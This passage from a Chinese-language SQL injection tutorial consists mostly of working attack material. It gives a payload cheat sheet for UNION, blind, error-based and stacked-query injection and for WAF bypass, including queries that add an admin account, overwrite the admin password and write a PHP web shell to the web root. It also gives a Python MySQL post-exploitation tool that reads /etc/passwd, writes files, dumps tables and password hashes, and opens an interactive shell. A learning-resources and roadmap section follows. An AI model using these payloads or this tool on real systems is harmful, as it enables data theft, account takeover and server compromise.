---

## 四、高级实战案例

### 4.1 SQL 注入高级利用

深入理解 SQL 注入的高级利用技术。

```sql
-- ===== SQL 注入分类与利用 =====

-- 1. 联合查询注入 (UNION-based)
-- 当页面会显示查询结果时使用
SELECT id, name, email FROM users WHERE id = 1 UNION SELECT 1, version(), database()-- 

-- 确定列数（使用 ORDER BY）
-- ?id=1' ORDER BY 3--+  (正常)
-- ?id=1' ORDER BY 4--+  (报错，说明3列)

-- 获取数据库名
?id=-1' UNION SELECT 1,2,database()--+

-- 获取所有数据库
?id=-1' UNION SELECT 1,2,group_concat(schema_name) FROM information_schema.schemata--+

-- 获取表名
?id=-1' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--+

-- 获取列名
?id=-1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--+

-- 拖库
?id=-1' UNION SELECT 1,username,password FROM users--+

-- ===== 2. 布尔盲注 (Boolean-based) =====
-- 页面只返回 True/False 两种状态

-- 判断数据库名长度
?id=1' AND length(database()) > 5--+

-- 逐字符猜解数据库名 (ASCII 码)
?id=1' AND ascii(substr(database(),1,1)) > 97--+
-- 二分法：97='a', 109='m', 122='z'

-- 逐字符猜解表名
?id=1' AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)) > 97--+

-- ===== 3. 时间盲注 (Time-based) =====
-- 页面无回显，通过响应时间判断

-- MySQL: SLEEP()
?id=1' AND SLEEP(5)--+

-- 条件时间注入
?id=1' AND IF(length(database())>5, SLEEP(5), 0)--+

-- 逐字符猜解
?id=1' AND IF(ascii(substr(database(),1,1))>97, SLEEP(5), 0)--+

-- 替代方案（无 SLEEP 时）
?id=1' AND BENCHMARK(10000000, MD5('test'))--+

-- PostgreSQL: pg_sleep()
?id=1'; SELECT pg_sleep(5)--

-- MSSQL: WAITFOR DELAY
?id=1'; WAITFOR DELAY '0:0:5'--

-- ===== 4. 报错注入 (Error-based) =====
-- 利用数据库报错信息获取数据

-- MySQL: updatexml / extractvalue
?id=1' AND updatexml(1, concat(0x7e, database(), 0x7e), 1)--+
?id=1' AND extractvalue(1, concat(0x7e, database(), 0x7e))--+

-- MySQL: floor + rand + group by
?id=1' AND (SELECT 1 FROM (SELECT count(*), concat(database(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

-- MSSQL: convert + cast
?id=1' AND 1=convert(int, db_name())--

-- Oracle: utl_inaddr / ctxsys.drithsx
?id=1' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--

-- ===== 5. 堆叠查询 (Stacked Queries) =====
-- 支持多语句执行的数据库

-- 新增管理员用户
?id=1'; INSERT INTO users(username, password, role) VALUES ('hacker', 'md5pass', 'admin')--+

-- 修改密码
?id=1'; UPDATE users SET password='new_hash' WHERE username='admin'--+

-- 文件读写
?id=1'; SELECT '<?php system($_GET[cmd]) ?>' INTO OUTFILE '/var/www/html/shell.php'--+

-- ===== 6. 宽字节注入 =====
-- 当使用 GBK 编码且 addslashes 转义时

-- %df%27 组合：%df\ 变成一个汉字，单引号逃逸
?id=1%df%27 AND 1=1--+

-- 原理：addslashes 会在 ' 前加 \，变成 \'
-- %df%5c%27 中 %df%5c 是一个 GBK 字符(運)，%27 逃逸

-- ===== 7. 二次注入 =====
-- 数据插入时被转义，但取出时未转义

-- 注册用户: admin'--
-- 当系统使用该用户名进行查询时：
-- SELECT * FROM users WHERE username='admin'--'  注入成功

-- ===== 8. 编码绕过 =====

-- URL 编码
?id=1%27%20AND%201%3D1--+

-- 双重 URL 编码
?id=1%2527 AND 1=1--+

-- Unicode 编码
?id=1%C0%A7  (宽字节绕过)

-- HTML 实体
?id=1&#39; AND 1=1--+

-- ===== 9. WAF 绕过 =====

-- 内联注释 (MySQL)
?id=1 /*!AND*/ 1=1--+
?id=1 /*!50000AND*/ 1=1--+

-- 大小写混合
?id=1' AnD 1=1--+

-- 空格替代
?id=1'AND%091=1--+      -- Tab
?id=1'AND%0a1=1--+      -- 换行
?id=1'AND%0b1=1--+      -- 垂直制表
?id=1'AND%0c1=1--+      -- 换页
?id=1'AND%0d1=1--+      -- 回车
?id=1'AND%a01=1--+      -- 不间断空格

-- 括号绕过
?id=1'AND(1=1)--+

-- 函数替代
?id=1' AND char(49)=char(49)--+
?id=1' AND 0x31=0x31--+

-- 等价函数
-- UNION SELECT -> UNION ALL SELECT
-- OR 1=1 -> || 1=1
-- AND 1=1 -> && 1=1
```

### 4.2 数据库渗透测试脚本

MySQL 后渗透利用工具。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
数据库渗透测试工具
仅用于授权安全测试
"""

import pymysql
import sys
import os
import hashlib

class MySQLPostExploit:
    """MySQL 后渗透利用工具"""
    
    def __init__(self, host, user, password, database=None, port=3306):
        self.host = host
        self.user = user
        self.password = password
        self.database = database
        self.port = port
        self.conn = None
        self.cursor = None
    
    def connect(self):
        """连接数据库"""
        try:
            self.conn = pymysql.connect(
                host=self.host,
                user=self.user,
                password=self.password,
                database=self.database,
                port=self.port,
                charset='utf8mb4'
            )
            self.cursor = self.conn.cursor()
            print(f"[+] 成功连接 {self.user}@{self.host}")
            return True
        except Exception as e:
            print(f"[-] 连接失败: {e}")
            return False
    
    def get_version(self):
        """获取数据库版本"""
        self.cursor.execute("SELECT VERSION()")
        version = self.cursor.fetchone()[0]
        print(f"[*] 数据库版本: {version}")
        return version
    
    def get_current_user(self):
        """获取当前用户"""
        self.cursor.execute("SELECT CURRENT_USER(), USER(), SYSTEM_USER()")
        result = self.cursor.fetchone()
        print(f"[*] 当前用户:")
        print(f"    CURRENT_USER: {result[0]}")
        print(f"    USER:         {result[1]}")
        print(f"    SYSTEM_USER:  {result[2]}")
        return result
    
    def get_databases(self):
        """获取所有数据库"""
        self.cursor.execute("SHOW DATABASES")
        dbs = [row[0] for row in self.cursor.fetchall()]
        print(f"[*] 数据库列表 ({len(dbs)} 个):")
        for db in dbs:
            print(f"    - {db}")
        return dbs
    
    def get_tables(self, database):
        """获取指定数据库的所有表"""
        try:
            self.cursor.execute(f"SHOW TABLES FROM `{database}`")
            tables = [row[0] for row in self.cursor.fetchall()]
            print(f"[*] {database} 数据库的表 ({len(tables)} 个):")
            for table in tables:
                print(f"    - {table}")
            return tables
        except Exception as e:
            print(f"[-] 无法获取表: {e}")
            return []
    
    def get_columns(self, database, table):
        """获取表结构"""
        try:
            self.cursor.execute(f"DESCRIBE `{database}`.`{table}`")
            columns = self.cursor.fetchall()
            print(f"[*] {database}.{table} 表结构:")
            for col in columns:
                print(f"    {col[0]:20s} {col[1]:20s} {col[2]:5s} {col[3]:5s} {col[4] or '':10s} {col[5] or ''}")
            return columns
        except Exception as e:
            print(f"[-] 无法获取列: {e}")
            return []
    
    def check_file_priv(self):
        """检查文件读写权限"""
        print("[*] 检查文件权限:")
        
        # 检查 FILE 权限
        self.cursor.execute("SELECT FILE_PRIV FROM mysql.user WHERE User=SUBSTRING_INDEX(CURRENT_USER(),'@',1) AND Host=SUBSTRING_INDEX(CURRENT_USER(),'@',-1)")
        result = self.cursor.fetchone()
        if result and result[0] == 'Y':
            print("    [+] FILE 权限: 有")
        else:
            print("    [-] FILE 权限: 无")
        
        # 检查 secure_file_priv
        self.cursor.execute("SHOW VARIABLES LIKE 'secure_file_priv'")
        result = self.cursor.fetchone()
        if result:
            print(f"    secure_file_priv: {result[1] or '(空，不受限)'}")
        
        # 尝试读文件
        try:
            self.cursor.execute("SELECT LOAD_FILE('/etc/passwd')")
            result = self.cursor.fetchone()
            if result and result[0]:
                print("    [+] 可以读取 /etc/passwd")
                return True
        except:
            pass
        
        return False
    
    def read_file(self, filepath):
        """读取文件"""
        try:
            self.cursor.execute(f"SELECT LOAD_FILE('{filepath}')")
            result = self.cursor.fetchone()
            if result and result[0]:
                print(f"[+] 文件内容 ({filepath}):")
                print(result[0][:500])
                if len(result[0]) > 500:
                    print("... (内容已截断)")
                return result[0]
            else:
                print("[-] 文件读取失败（可能路径错误或权限不足）")
                return None
        except Exception as e:
            print(f"[-] 读取失败: {e}")
            return None
    
    def write_file(self, content, filepath):
        """写入文件 (INTO OUTFILE)"""
        try:
            # 使用十六进制避免引号问题
            hex_content = content.encode().hex()
            query = f"SELECT 0x{hex_content} INTO DUMPFILE '{filepath}'"
            self.cursor.execute(query)
            print(f"[+] 文件写入成功: {filepath}")
            return True
        except Exception as e:
            print(f"[-] 写入失败: {e}")
            return False
    
    def get_users(self):
        """获取所有用户"""
        try:
            self.cursor.execute("SELECT User, Host FROM mysql.user ORDER BY User")
            users = self.cursor.fetchall()
            print(f"[*] 用户列表 ({len(users)} 个):")
            for user, host in users:
                print(f"    {user}@{host}")
            return users
        except Exception as e:
            print(f"[-] 无法获取用户: {e}")
            return []
    
    def get_user_privileges(self):
        """获取当前用户权限"""
        self.cursor.execute("SHOW GRANTS FOR CURRENT_USER()")
        grants = self.cursor.fetchall()
        print("[*] 当前用户权限:")
        for grant in grants:
            print(f"    {grant[0]}")
        return grants
    
    def check_udf(self):
        """检查是否存在自定义函数"""
        try:
            self.cursor.execute("SELECT name, dl FROM mysql.func")
            funcs = self.cursor.fetchall()
            if funcs:
                print("[!] 发现自定义函数 (UDF):")
                for name, dl in funcs:
                    print(f"    {name}: {dl}")
            else:
                print("[*] 无自定义函数")
            return funcs
        except:
            print("[-] 无法查询 mysql.func（可能无权限）")
            return []
    
    def dump_table(self, database, table, limit=None):
        """导出表数据"""
        try:
            query = f"SELECT * FROM `{database}`.`{table}`"
            if limit:
                query += f" LIMIT {limit}"
            
            self.cursor.execute(query)
            rows = self.cursor.fetchall()
            
            # 获取列名
            columns = [desc[0] for desc in self.cursor.description]
            
            print(f"[*] {database}.{table} 数据 ({len(rows)} 行):")
            print("    " + " | ".join(columns))
            print("    " + "-" * 80)
            
            for row in rows[:10]:  # 最多显示 10 行
                print("    " + " | ".join(str(c)[:30] for c in row))
            
            if len(rows) > 10:
                print(f"    ... 共 {len(rows)} 行")
            
            return rows
        except Exception as e:
            print(f"[-] 导出失败: {e}")
            return []
    
    def get_hash_passwords(self):
        """获取用户密码哈希 (MySQL 5.x)"""
        try:
            self.cursor.execute("SELECT User, Host, Password FROM mysql.user")
            users = self.cursor.fetchall()
            print("[*] 用户密码哈希:")
            for user, host, pwd in users:
                if pwd:
                    print(f"    {user}@{host}: {pwd[:20]}...")
                else:
                    print(f"    {user}@{host}: (空密码)")
            return users
        except Exception as e:
            print(f"[-] 获取失败: {e}")
            return []
    
    def interactive_shell(self):
        """交互式 SQL Shell"""
        print("\n[*] 进入 SQL 交互模式 (输入 exit 退出)")
        while True:
            try:
                query = input("mysql> ").strip()
                if not query:
                    continue
                if query.lower() in ['exit', 'quit', '\\q']:
                    break
                
                self.cursor.execute(query)
                
                if query.upper().startswith(('SELECT', 'SHOW', 'DESCRIBE', 'DESC', 'EXPLAIN')):
                    rows = self.cursor.fetchall()
                    columns = [desc[0] for desc in self.cursor.description]
                    
                    print(" | ".join(columns))
                    print("-" * 80)
                    for row in rows[:50]:
                        print(" | ".join(str(c) for c in row))
                    if len(rows) > 50:
                        print(f"... 共 {len(rows)} 行")
                else:
                    self.conn.commit()
                    print(f"Query OK, {self.cursor.rowcount} rows affected")
                    
            except KeyboardInterrupt:
                print("\n[!] 中断")
                break
            except Exception as e:
                print(f"[-] 错误: {e}")
    
    def close(self):
        if self.cursor:
            self.cursor.close()
        if self.conn:
            self.conn.close()
        print("[*] 连接已关闭")


# ===== 使用示例 =====
if __name__ == '__main__':
    if len(sys.argv) < 4:
        print("用法: python mysql_postexploit.py <host> <user> <password> [database]")
        print("示例: python mysql_postexploit.py 127.0.0.1 root password mysql")
        sys.exit(1)
    
    host = sys.argv[1]
    user = sys.argv[2]
    password = sys.argv[3]
    database = sys.argv[4] if len(sys.argv) > 4 else None
    
    exploit = MySQLPostExploit(host, user, password, database)
    
    if exploit.connect():
        exploit.get_version()
        exploit.get_current_user()
        exploit.get_user_privileges()
        exploit.check_file_priv()
        exploit.interactive_shell()
        exploit.close()
```

---

## 五、进阶学习资源

### 5.1 SQL 注入学习资源

- **SQL Injection Wiki**：https://sqlmap.org/
- **PortSwigger SQLi**：https://portswigger.net/web-security/sql-injection
- **OWASP SQLi**：https://owasp.org/www-community/attacks/SQL_Injection
- **SQL Injection Cheat Sheet**：https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

### 5.2 数据库安全资源

- **MySQL 安全**：https://dev.mysql.com/doc/refman/8.0/en/security.html
- **PostgreSQL 安全**：https://www.postgresql.org/docs/current/security.html
- **MSSQL 安全**：https://learn.microsoft.com/zh-cn/sql/relational-databases/security/security-center-for-sql-server-database-engine-and-azure-sql-database
- **Oracle 安全**：https://www.oracle.com/security/

### 5.3 安全工具

- **注入工具**：
  - sqlmap — 自动化 SQL 注入：https://sqlmap.org/
  - SQLNinja — SQL Server 注入工具
  - BSQL Hacker — 盲注工具
  - Havij — SQL 注入工具（已过时，学习用）

- **数据库管理**：
  - Navicat — 数据库管理工具
  - DBeaver — 通用数据库工具
  - phpMyAdmin — MySQL Web 管理
  - pgAdmin — PostgreSQL 管理

- **审计与加固**：
  - MySQL Audit Plugin
  - GreenSQL — 数据库防火墙
  - Database Firewall
  - DataSunrise — 数据库安全

### 5.4 各类数据库注入语法

- **MySQL**：
  - 注释：`-- `, `#`, `/*...*/`
  - 字符串连接：`CONCAT()`
  - 延时：`SLEEP()`, `BENCHMARK()`
  - 报错：`UPDATEXML()`, `EXTRACTVALUE()`
  - 文件读写：`LOAD_FILE()`, `INTO OUTFILE`

- **MSSQL**：
  - 注释：`--`, `/*...*/`
  - 字符串连接：`+`
  - 延时：`WAITFOR DELAY`
  - 报错：`CONVERT()`, `CAST()`
  - 堆叠查询：支持
  - xp_cmdshell：命令执行

- **Oracle**：
  - 注释：`--`, `/*...*/`
  - 字符串连接：`||`
  - 延时：`DBMS_LOCK.SLEEP()`
  - 报错：`UTL_INADDR.GET_HOST_NAME()`
  - 系统表：`ALL_TABLES`, `USER_TABLES`

- **PostgreSQL**：
  - 注释：`--`, `/*...*/`
  - 字符串连接：`||`
  - 延时：`PG_SLEEP()`
  - 报错：`CAST()`
  - 堆叠查询：支持
  - COPY 命令：文件读写

- **Access**：
  - 注释：无标准注释
  - 系统表：`MSysObjects`
  - 联合查询：`UNION SELECT`
  - 无 LIMIT，用 `TOP`

- **SQLite**：
  - 注释：`--`, `/*...*/`
  - 系统表：`sqlite_master`
  - 无存储过程
  - 无堆叠查询

### 5.5 CTF 与练习平台

- **SQL Injection Labs**：http://www.sqli-labs.com/
- **PortSwigger Web Academy**：https://portswigger.net/web-security/all-topics
- **Hack The Box**：https://www.hackthebox.com/
- **TryHackMe**：https://tryhackme.com/
- **攻防世界**：https://adworld.xctf.org.cn/
- **BUUCTF**：https://buuoj.cn/
- **picoCTF**：https://picoctf.org/

### 5.6 推荐书籍

- **SQL 编程**：
  - 《SQL 必知必会》
  - 《SQL 进阶教程》
  - 《MySQL 必知必会》
  - 《高性能 MySQL》

- **SQL 注入**：
  - 《SQL 注入攻击与防御》
  - 《Web 安全深度剖析》
  - 《白帽子讲 Web 安全》
  - 《数据库黑客大曝光》

- **数据库安全**：
  - 《数据库安全与保护》
  - 《Oracle 数据库攻防之道》
  - 《MySQL 安全策略》

### 5.7 社区与博客

- **FreeBuf**：https://www.freebuf.com/
- **安全客**：https://www.anquanke.com/
- **先知社区**：https://xz.aliyun.com/
- **看雪论坛**：https://bbs.pediy.com/
- **SQLi 博客**：https://sqlmap.blogspot.com/

### 5.8 进阶学习路线

**第 1 阶段：SQL 基础（1月）**
- SQL 语法与查询
- 数据库设计
- 索引优化
- 存储过程与触发器

**第 2 阶段：SQL 注入基础（1-2月）**
- 联合查询注入
- 布尔盲注
- 时间盲注
- 报错注入

**第 3 阶段：高级注入技术（2-3月）**
- 堆叠查询注入
- 二次注入
- 宽字节注入
- 编码绕过
- WAF 绕过

**第 4 阶段：数据库提权（2-3月）**
- UDF 提权
- xp_cmdshell
- 注册表操作
- 权限提升

**第 5 阶段：实战与工具开发（持续）**
- sqlmap 使用与开发
- CTF SQL 题目
- 自动化注入工具
- 漏洞研究
